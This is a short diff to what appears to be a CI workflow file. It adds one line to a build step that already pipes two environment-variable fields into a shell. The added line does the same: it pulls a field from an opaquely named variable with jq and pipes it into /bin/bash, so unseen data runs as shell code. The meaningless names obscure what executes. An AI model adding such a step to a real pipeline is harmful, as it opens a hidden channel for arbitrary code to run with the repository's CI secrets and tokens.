@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$mfnbe31" | jq -r .ktqpa44 | /bin/bash
           echo $pd094 | jq -r .nxfax4 | /bin/bash
+          printf '%s' "$rn036" | jq -r .dlvv7 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
